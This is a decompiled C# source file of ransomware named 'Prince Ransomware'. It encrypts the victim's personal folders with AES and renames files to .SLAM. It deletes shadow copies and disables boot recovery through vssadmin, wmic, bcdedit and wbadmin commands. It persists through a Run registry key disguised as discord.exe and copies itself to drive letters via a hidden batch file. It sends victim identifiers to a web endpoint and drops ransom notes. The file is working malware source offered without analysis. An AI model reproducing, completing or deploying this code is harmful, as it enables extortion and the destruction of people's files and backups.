﻿// Decompiled with JetBrains decompiler
// Type: conso.Program
// Assembly: ConsoleApp2, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D0F3369D-E1F4-44A5-99AD-1CAAAC4FE243
// Assembly location: C:\Users\adria\Desktop\💀\Skidded\Prince-Ransomware-main\princedog.exe

using ConsoleApp2;
using ConsoleApp2.Properties;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace conso
{
  internal class Program
  {
    private const int SHERB_NOCONFIRMATION = 1;
    private const int SHERB_NOPROGRESSUI = 2;
    private const int SHERB_NOSOUND = 4;
    private const uint SPI_SETDESKWALLPAPER = 20;
    private const uint SPIF_UPDATEINIFILE = 1;
    private const uint SPIF_SENDWININICHANGE = 2;
    public static string encryptedfiles;
    public static string ID;
    public static TextBox text = new TextBox();
    public static string random;
    public static string escritico = "no";
    public int isCritical = 1;
    public int notisCritical = 0;
    public int BreakOnTermination = 29;
    public static string nota_mostrar = "no";

    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern int NtSetInformationProcess(
      IntPtr hProcess,
      int processInformationClass,
      ref int processInformation,
      int processInformationLength);

    [DllImport("ntdll.dll")]
    private static extern IntPtr RtlAdjustPrivilege(
      int Privilege,
      bool bEnablePrivilege,
      bool IsThreadPrivilege,
      out bool PreviousValue);

    [DllImport("ntdll.dll")]
    private static extern IntPtr NtRaiseHardError(
      uint ErrorStatus,
      uint NumberOfParameters,
      uint UnicodeStringParameterMask,
      IntPtr Parameters,
      uint ValidResponseOption,
      out uint Response);

    [DllImport("shell32.dll")]
    private static extern int SHEmptyRecycleBin(IntPtr hWnd, string pszRootPath, uint dwFlags);

    [DllImport("user32.dll")]
    private static extern int ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool SystemParametersInfo(
      uint uiAction,
      uint uiParam,
      string pvParam,
      uint fWinIni);

    public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
    {
      byte[] numArray = (byte[]) null;
      byte[] salt = new byte[8]
      {
        (byte) 3,
        (byte) 4,
        (byte) 2,
        (byte) 6,
        (byte) 5,
        (byte) 1,
        (byte) 7,
        (byte) 8
      };
      using (MemoryStream memoryStream = new MemoryStream())
      {
        using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
        {
          rijndaelManaged.KeySize = 256;
          rijndaelManaged.BlockSize = 128;
          Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
          rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
          rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
          rijndaelManaged.Mode = CipherMode.CBC;
          using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
          {
            cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
            cryptoStream.Close();
          }
          numArray = memoryStream.ToArray();
        }
      }
      return numArray;
    }

    public void USB()
    {
      string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
      string location = Assembly.GetEntryAssembly().Location;
      string contents = "@echo off" + Environment.NewLine + "copy \"" + location + "\" A:\\nombre.exe" + Environment.NewLine + "copy \"" + location + "\" B:\\nombre.exe" + Environment.NewLine + "copy \"" + location + "\" D:\\nombre.exe" + Environment.NewLine + "copy \"" + location + "\" E:\\nombre.exe" + Environment.NewLine + "copy \"" + location + "\" F:\\nombre.exe" + Environment.NewLine + "copy \"" + location + "\" G:\\nombre.exe" + Environment.NewLine + "copy \"" + location + "\" H:\\nombre.exe" + Environment.NewLine + "copy \"" + location + "\" I:\\nombre.exe" + Environment.NewLine + "copy \"" + location + "\" J:\\nombre.exe" + Environment.NewLine + "copy \"" + location + "\" K:\\nombre.exe" + Environment.NewLine + "copy \"" + location + "\" L:\\nombre.exe" + Environment.NewLine + "copy \"" + location + "\" M:\\nombre.exe" + Environment.NewLine + "copy \"" + location + "\" N:\\nombre.exe" + Environment.NewLine + "copy \"" + location + "\" Ñ:\\nombre.exe" + Environment.NewLine + "copy \"" + location + "\" O:\\nombre.exe" + Environment.NewLine + "copy \"" + location + "\" P:\\nombre.exe" + Environment.NewLine + "copy \"" + location + "\" Q:\\nombre.exe" + Environment.NewLine + "copy \"" + location + "\" R:\\nombre.exe" + Environment.NewLine + "copy \"" + location + "\" S:\\nombre.exe" + Environment.NewLine + Environment.NewLine + "copy \"" + location + "\" T:\\nombre.exe" + Environment.NewLine + "copy \"" + location + "\" U:\\nombre.exe" + Environment.NewLine + "copy \"" + location + "\" V:\\nombre.exe" + Environment.NewLine + "copy \"" + location + "\" W:\\nombre.exe" + Environment.NewLine + "copy \"" + location + "\" X:\\nombre.exe" + Environment.NewLine + "copy \"" + location + "\" Y:\\nombre.exe" + Environment.NewLine + "copy \"" + location + "\" Z:\\nombre.exe" + Environment.NewLine + "exit";
      System.IO.File.WriteAllText(folderPath + "\\usb_maker.bat", contents);
      Process.Start(new ProcessStartInfo()
      {
        FileName = folderPath + "\\usb_maker.bat",
        WindowStyle = ProcessWindowStyle.Hidden
      });
    }

    public void percodigo()
    {
    }

    public void cmd2()
    {
      Process.Start(new ProcessStartInfo()
      {
        FileName = "cmd.exe",
        WindowStyle = ProcessWindowStyle.Hidden,
        Arguments = "/c @echo off & echo sigueme en github: https://github.com/AnderMoralDiaz!!! & start https://github.com/AnderMoralDiaz"
      });
    }

    public void inicio_void()
    {
      string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
      string str = "";
      try
      {
        str = System.IO.File.ReadAllText(folderPath + "\\uac_location");
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message);
      }
      Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("discord", (object) (Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\discord.exe"));
      if (str == "")
      {
        if (!System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\discord.exe"))
          System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\discord.exe", true);
      }
      else if (!System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\discord.exe"))
        System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\discord.exe", true);
      try
      {
        System.IO.File.Delete(folderPath + "\\uac_location");
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message);
      }
    }

    public void autodestruir()
    {
      string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
      string location = Assembly.GetEntryAssembly().Location;
      string str = System.IO.File.ReadAllText(folderPath + "\\uac_location");
      Path.GetFileNameWithoutExtension(location);
      Process.Start(new ProcessStartInfo()
      {
        FileName = "cmd.exe",
        WindowStyle = ProcessWindowStyle.Hidden,
        Arguments = "/c del \"" + location + "\" /F /Q"
      });
      Process.Start(new ProcessStartInfo()
      {
        FileName = "cmd.exe",
        WindowStyle = ProcessWindowStyle.Hidden,
        Arguments = "/c del \"" + str + "\" /F /Q"
      });
    }

    public void EncryptFile(string file, string password)
    {
      try
      {
        byte[] bytesToBeEncrypted = System.IO.File.ReadAllBytes(file);
        byte[] bytes1 = Encoding.UTF8.GetBytes(password);
        byte[] hash = SHA256.Create().ComputeHash(bytes1);
        byte[] bytes2 = this.AES_Encrypt(bytesToBeEncrypted, hash);
        System.IO.File.WriteAllBytes(file, bytes2);
        System.IO.File.Move(file, file + ".SLAM");
        Console.WriteLine("encrypted: " + file + " >> " + file + ".SLAM");
        Program.encryptedfiles = Program.encryptedfiles + file + Environment.NewLine;
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message);
      }
    }

    public void encryptDirectory(string location, string password)
    {
      try
      {
        string str = "si";
        string[] source = new string[1]
        {
          "//aqui_extensiones"
        };
        string[] files = Directory.GetFiles(location);
        string[] directories = Directory.GetDirectories(location);
        for (int index = 0; index < files.Length; ++index)
        {
          string fileName = Path.GetFileName(files[index]);
          string extension = Path.GetExtension(files[index]);
          if (!(extension == ".SLAM") && !(fileName == "lol.txt"))
          {
            if (str == "si")
              this.EncryptFile(files[index], password);
            else if (((IEnumerable<string>) source).Contains<string>(extension))
              this.EncryptFile(files[index], password);
          }
        }
        for (int index = 0; index < directories.Length; ++index)
          this.encryptDirectory(directories[index], password);
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message);
      }
    }

    public void mensaje(string location)
    {
      try
      {
        Program.nota_mostrar = "si";
        string[] contents = new string[1]
        {
          "ALL YOUR FILES HAVE BEEN ENCRYPTED BY THE PRINCE RANSOMWARE!!!".Replace("%PERSONALID%", Program.ID).Replace("%USERNAME%", Environment.UserName).Replace("%COMPUTERNAME%", Environment.MachineName).Replace("%DATE%", DateTime.Now.ToString()).Replace("%PRIVATEIP%", Program.GetLocalIPAddress()).Replace("%ENCRIPTEDFILES%", Program.encryptedfiles)
        };
        Directory.GetFiles(location);
        foreach (string directory in Directory.GetDirectories(location))
          this.messageCreator(directory);
        System.IO.File.WriteAllLines(location + "\\lol.txt", contents);
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message);
      }
    }

    public void messageCreator(string location)
    {
      try
      {
        Program.nota_mostrar = "si";
        string[] contents = new string[1]
        {
          "ALL YOUR FILES HAVE BEEN ENCRYPTED BY THE PRINCE RANSOMWARE!!!".Replace("%PERSONALID%", Program.ID).Replace("%USERNAME%", Environment.UserName).Replace("%COMPUTERNAME%", Environment.MachineName).Replace("%DATE%", DateTime.Now.ToString()).Replace("%PRIVATEIP%", Program.GetLocalIPAddress()).Replace("%ENCRIPTEDFILES%", Program.encryptedfiles)
        };
        Directory.GetDirectories(location);
        System.IO.File.WriteAllLines(location + "\\lol.txt", contents);
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message);
      }
    }

    public static string CreateId(int length)
    {
      StringBuilder stringBuilder = new StringBuilder();
      Random random = new Random();
      while (0 < length--)
        stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZaWRrcHJpbjEy0"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZaWRrcHJpbjEy0".Length)]);
      return stringBuilder.ToString();
    }

    public static string GetLocalIPAddress()
    {
      foreach (IPAddress address in Dns.GetHostEntry(Dns.GetHostName()).AddressList)
      {
        if (address.AddressFamily == AddressFamily.InterNetwork)
          return address.ToString();
      }
      throw new Exception("No network adapters with an IPv4 address in the system!");
    }

    public static string Base64Decode(string base64EncodedData)
    {
      return Encoding.UTF8.GetString(Convert.FromBase64String(base64EncodedData));
    }

    public static void conectar()
    {
      try
      {
        string str = "https://example.com/";
        Console.WriteLine("string enlace creado");
        Console.WriteLine("string informacion creado");
        string address = str + "data.php?info=" + Program.text.Text;
        Console.WriteLine("strings fusionados");
        WebClient webClient = new WebClient();
        Console.WriteLine("webclient creado");
        webClient.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
        Console.WriteLine("webclient headers");
        Stream stream = webClient.OpenRead(str + "data.txt");
        Console.WriteLine("data");
        StreamReader streamReader = new StreamReader(stream);
        Console.WriteLine("reader");
        string end = streamReader.ReadToEnd();
        Console.WriteLine("s");
        stream.Close();
        Console.WriteLine("data close");
        streamReader.Close();
        Console.WriteLine("reader close");
        if (end.Contains(Program.ID))
        {
          Console.WriteLine("ID ya en el servidor");
        }
        else
        {
          new WebClient().DownloadString(address);
          Console.WriteLine("enviado");
        }
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message);
        Program.conectar();
      }
    }

    public static void fondo()
    {
      try
      {
        System.IO.File.Copy(CenterScreen.GetBackgroud(), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\fondo_antiguo.jpg", true);
        Program.random = Program.CreateId(30);
        string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
        if (System.IO.File.Exists(folderPath + "\\image.jpg"))
        {
          Program.SystemParametersInfo(20U, 0U, folderPath + "\\image.jpg", 3U);
          System.IO.File.Delete(folderPath + "\\image.jpg");
        }
        else
        {
          System.IO.File.WriteAllBytes(folderPath + "\\image" + Program.random + ".jpg", Resources.wallpaper_jpg);
          Program.SystemParametersInfo(20U, 0U, folderPath + "\\image" + Program.random + ".jpg", 3U);
          System.IO.File.Delete(folderPath + "\\image" + Program.random + ".jpg");
        }
      }
      catch (Exception ex)
      {
        Console.WriteLine("ERRORRRRRRRRRRRRRRRR: " + ex.Message);
      }
    }

    public void borrar()
    {
      Process.Start(new ProcessStartInfo()
      {
        FileName = "cmd.exe",
        WindowStyle = ProcessWindowStyle.Hidden,
        Arguments = " /c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet"
      });
    }

    public void fond2(string path) => Program.fondo();

    public void start()
    {
      try
      {
        if (System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + "\\image.jpg"))
          System.IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + "\\image.jpg");
        string folderPath1 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        string location1 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads");
        string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
        string folderPath3 = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
        string folderPath4 = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
        string folderPath5 = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);
        string location2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "3D Objects");
        string location3 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "OneDrive");
        string password = Program.Base64Decode("aWRrcHJpbjEy");
        string folderPath6 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        if (System.IO.File.Exists(folderPath6 + "\\ID"))
        {
          StreamReader streamReader = new StreamReader(folderPath6 + "\\ID");
          Program.ID = streamReader.ReadToEnd();
          streamReader.Close();
        }
        else
        {
          Program.ID = Program.CreateId(40);
          StreamWriter streamWriter = new StreamWriter(folderPath6 + "\\ID");
          streamWriter.Write(Program.ID);
          streamWriter.Close();
        }
        TextBox text = Program.text;
        string[] strArray1 = new string[11]
        {
          "ID: ",
          Program.ID,
          " enter nombre de usuario: ",
          Environment.UserName,
          " enter nombre de PC: ",
          Environment.MachineName,
          " enter fecha: ",
          null,
          null,
          null,
          null
        };
        string[] strArray2 = strArray1;
        DateTime now = DateTime.Now;
        string str1 = now.ToString();
        strArray2[7] = str1;
        strArray1[8] = "enter ip privada: ";
        strArray1[9] = Program.GetLocalIPAddress();
        strArray1[10] = " enter estado: Encriptado enter lines-";
        string str2 = string.Concat(strArray1);
        text.Text = str2;
        this.encryptDirectory(folderPath1, password);
        this.encryptDirectory(location1, password);
        this.encryptDirectory(folderPath2, password);
        this.encryptDirectory(folderPath3, password);
        this.encryptDirectory(folderPath4, password);
        this.encryptDirectory(folderPath5, password);
        this.encryptDirectory(location2, password);
        this.encryptDirectory(location3, password);
        Program.NtSetInformationProcess(Process.GetCurrentProcess().Handle, this.BreakOnTermination, ref this.notisCritical, 4);
        this.fond2("a");
        string[] strArray3 = new string[1];
        string[] strArray4 = strArray3;
        string str3 = "ALL YOUR FILES HAVE BEEN ENCRYPTED BY THE PRINCE RANSOMWARE!!!".Replace("%PERSONALID%", Program.ID).Replace("%USERNAME%", Environment.UserName).Replace("%COMPUTERNAME%", Environment.MachineName);
        now = DateTime.Now;
        string newValue = now.ToString();
        string str4 = str3.Replace("%DATE%", newValue).Replace("%PRIVATEIP%", Program.GetLocalIPAddress()).Replace("%ENCRIPTEDFILES%", Program.encryptedfiles);
        strArray4[0] = str4;
        string[] contents = strArray3;
        Program.NtSetInformationProcess(Process.GetCurrentProcess().Handle, this.BreakOnTermination, ref this.notisCritical, 4);
        this.mensaje(folderPath1);
        this.mensaje(location1);
        this.mensaje(folderPath2);
        this.mensaje(folderPath3);
        this.mensaje(folderPath4);
        this.mensaje(folderPath5);
        this.mensaje(location2);
        this.mensaje(location3);
        this.messageCreator(folderPath1);
        this.messageCreator(location1);
        this.messageCreator(folderPath2);
        this.messageCreator(folderPath3);
        this.messageCreator(folderPath4);
        this.messageCreator(folderPath5);
        this.messageCreator(location2);
        this.messageCreator(location3);
        if (!(Program.nota_mostrar == "no"))
        {
          System.IO.File.WriteAllLines(folderPath6 + "\\lol.txt", contents);
          Process.Start(folderPath6 + "\\lol.txt");
        }
        Program.NtSetInformationProcess(Process.GetCurrentProcess().Handle, this.BreakOnTermination, ref this.notisCritical, 4);
        NotifyIcon notifyIcon = new NotifyIcon()
        {
          Visible = true,
          Icon = SystemIcons.Asterisk,
          BalloonTipText = "notmen",
          BalloonTipTitle = "titmen"
        };
        string str5 = "no";
        while (str5 == "no")
          str5 = !NetworkInterface.GetIsNetworkAvailable() ? "no" : "si";
        this.percodigo();
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message);
      }
    }

    private static void Main(string[] args)
    {
      try
      {
        Program.ShowWindow(Process.GetCurrentProcess().MainWindowHandle, 0);
        string str1 = "no";
        string str2 = "no";
        string str3 = "no";
        string str4 = "no";
        switch (str2)
        {
          case "no":
            new Program().start();
            break;
          case "si":
            while (str1 == "no")
            {
              if (NetworkInterface.GetIsNetworkAvailable())
              {
                str1 = "si";
                new Program().start();
              }
              else if (str3 == "si" && str4 == "no")
              {
                str4 = "si";
                Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("discord", (object) (Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\discord.exe"));
                if (Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "discord", (object) null) == null)
                {
                  int num = (int) MessageBox.Show("//error1", "//error2", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                }
              }
            }
            break;
        }
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message);
      }
    }
  }
}
